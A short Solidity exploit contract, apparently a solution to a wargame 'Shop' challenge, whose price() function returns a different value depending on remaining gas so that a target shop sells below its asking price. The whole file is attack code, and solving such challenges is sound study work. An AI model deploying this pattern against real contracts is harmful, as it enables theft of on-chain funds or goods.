// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Buyer {
    function price() external view returns (uint);
}

/// @dev As I'm the one which instantiate the message call I will just set a gas and when the second call will come this
/// amount will be lower, just calculate the gas left after the second call and you win.
contract HackShop is Buyer {
    address shop;
    uint256 gasUsed = 100000;

    constructor(address _shop) {
        shop = _shop;
    }

    function attack() public {
        (bool success,) = shop.call{gas: gasUsed}(abi.encodeWithSignature("buy()"));
        require(success);
    }

    function price() external view returns (uint) {
        return gasleft() > 10000 ? 100 : 1;
    }
}